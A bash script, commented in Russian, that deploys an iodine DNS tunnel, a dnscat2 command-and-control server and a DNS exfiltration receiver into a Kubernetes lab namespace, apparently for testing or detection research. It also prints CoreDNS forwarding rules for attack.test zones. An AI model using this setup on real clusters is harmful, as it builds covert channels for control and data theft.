#!/bin/bash
#
# Деплой серверов attack-инструментов внутри кластера (namespace attack-server).
# Три отдельных сервиса (iodine-dns, dnscat2-dns, exfil-dns) — все серверы могут работать одновременно.
#
# Использование:
#   ./deploy.sh setup         # создать namespace + 3 service, показать CoreDNS
#   ./deploy.sh all           # запустить все три сервера (Phase C)
#   ./deploy.sh iodine        # только iodine server (остальные не трогает)
#   ./deploy.sh dnscat2       # только dnscat2 server
#   ./deploy.sh exfil         # только exfil receiver
#   ./deploy.sh stop          # остановить все серверы
#   ./deploy.sh cleanup       # удалить всё
#   ./deploy.sh status        # статус
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NS="attack-server"

stop_all_servers() {
  kubectl delete -f "${SCRIPT_DIR}/01-iodine-server.yaml" --ignore-not-found 2>/dev/null || true
  kubectl delete -f "${SCRIPT_DIR}/02-dnscat2-server.yaml" --ignore-not-found 2>/dev/null || true
  kubectl delete -f "${SCRIPT_DIR}/03-exfil-receiver.yaml" --ignore-not-found 2>/dev/null || true
}

show_coredns_instructions() {
  echo ""
  echo "=== CoreDNS: настройка форварда (три зоны) ==="
  echo ""
  IP_IODINE=$(kubectl get svc iodine-dns -n "$NS" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "<pending>")
  IP_DNSCAT=$(kubectl get svc dnscat2-dns -n "$NS" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "<pending>")
  IP_EXFIL=$(kubectl get svc exfil-dns -n "$NS" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "<pending>")
  echo "ClusterIP: iodine-dns=${IP_IODINE}  dnscat2-dns=${IP_DNSCAT}  exfil-dns=${IP_EXFIL}"
  echo ""
  echo "Выполните: kubectl edit configmap coredns -n kube-system"
  echo "В Corefile добавьте ПЕРЕД блоком .:53 три блока:"
  echo ""
  echo "    t.attack.test:53 {"
  echo "        forward . ${IP_IODINE}"
  echo "        log"
  echo "    }"
  echo "    c2.attack.test:53 {"
  echo "        forward . ${IP_DNSCAT}"
  echo "        log"
  echo "    }"
  echo "    exfil.attack.test:53 {"
  echo "        forward . ${IP_EXFIL}"
  echo "        log"
  echo "    }"
  echo ""
  echo "Сохраните, затем: kubectl rollout restart deployment coredns -n kube-system"
  echo ""
}

case "${1:-}" in
  setup)
    echo "=== Creating namespace and service ==="
    kubectl apply -f "${SCRIPT_DIR}/00-namespace-and-service.yaml"
    echo ""
    echo "=== Waiting for service to get ClusterIP ==="
    sleep 2
    show_coredns_instructions
    echo "Clients run in namespace 'attack'. From attack/ (parent of servers/): ./deploy.sh ns  then  ./deploy.sh iodine|dnscat2|exfil"
    ;;

  iodine)
    echo "=== Deploying iodine server ==="
    kubectl apply -f "${SCRIPT_DIR}/01-iodine-server.yaml"
    echo ""
    echo "Iodine server deploying. Wait for pod to be ready:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then from attack/ directory (parent of servers/):"
    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh iodine"
    echo "  2) Set domain and restart client:"
    echo "     kubectl set env deployment/iodine-client ATTACK_DOMAIN=t.attack.test -n attack"
    echo "     kubectl rollout restart deployment/iodine-client -n attack"
    ;;

  dnscat2)
    echo "=== Deploying dnscat2 server ==="
    kubectl apply -f "${SCRIPT_DIR}/02-dnscat2-server.yaml"
    echo ""
    echo "dnscat2 server deploying (gem install takes 1-2 min). Wait for pod:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then from attack/ directory (parent of servers/):"
    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh dnscat2"
    echo "  2) Set domain and restart client:"
    echo "     kubectl set env deployment/dnscat2-client ATTACK_DOMAIN=c2.attack.test -n attack"
    echo "     kubectl rollout restart deployment/dnscat2-client -n attack"
    ;;

  exfil)
    echo "=== Deploying DNS exfil receiver ==="
    kubectl apply -f "${SCRIPT_DIR}/03-exfil-receiver.yaml"
    echo ""
    echo "Exfil receiver deploying. Wait for pod:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then from attack/ directory (parent of servers/):"
    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh exfil"
    echo "  2) Set domain and restart client:"
    echo "     kubectl set env deployment/dnsexfiltrator-client EXFIL_DOMAIN=exfil.attack.test -n attack"
    echo "     kubectl rollout restart deployment/dnsexfiltrator-client -n attack"
    ;;

  all)
    echo "=== Deploying all three servers (Phase C) ==="
    kubectl apply -f "${SCRIPT_DIR}/01-iodine-server.yaml"
    kubectl apply -f "${SCRIPT_DIR}/02-dnscat2-server.yaml"
    kubectl apply -f "${SCRIPT_DIR}/03-exfil-receiver.yaml"
    echo ""
    echo "All servers deploying. Wait for pods: kubectl get pods -n $NS -w"
    echo "Then deploy clients from attack/ and run collect.sh for Phase C."
    ;;

  stop)
    echo "=== Stopping all servers ==="
    stop_all_servers
    echo "Done. Services and namespace preserved."
    ;;

  cleanup)
    echo "=== Removing everything ==="
    stop_all_servers
    kubectl delete -f "${SCRIPT_DIR}/00-namespace-and-service.yaml" --ignore-not-found 2>/dev/null || true
    echo ""
    echo "Don't forget to remove the three attack.test zones from CoreDNS:"
    echo "  kubectl edit configmap coredns -n kube-system"
    echo "  (remove t.attack.test:53, c2.attack.test:53, exfil.attack.test:53 blocks)"
    echo "  kubectl rollout restart deployment coredns -n kube-system"
    ;;

  status)
    echo "=== Services ==="
    kubectl get svc -n "$NS" 2>/dev/null || echo "No services found"
    echo ""
    echo "=== Pods ==="
    kubectl get pods -n "$NS" -o wide 2>/dev/null || echo "No pods found"
    echo ""
    echo "=== Server logs (last 10 lines) ==="
    for pod in $(kubectl get pods -n "$NS" -o name 2>/dev/null); do
      echo "--- $pod ---"
      kubectl logs "$pod" -n "$NS" --tail=10 2>/dev/null || true
    done
    ;;

  *)
    echo "Usage: $0 {setup|iodine|dnscat2|exfil|all|stop|cleanup|status}"
    echo ""
    echo "  setup    — create namespace + 3 services, show CoreDNS instructions"
    echo "  iodine   — deploy iodine server only"
    echo "  dnscat2  — deploy dnscat2 server only"
    echo "  exfil    — deploy DNS exfil receiver only"
    echo "  all      — deploy all three servers at once (Phase C)"
    echo "  stop     — stop all servers (keep namespace/services)"
    echo "  cleanup  — remove everything"
    echo "  status   — show pods, services, logs"
    exit 1
    ;;
esac
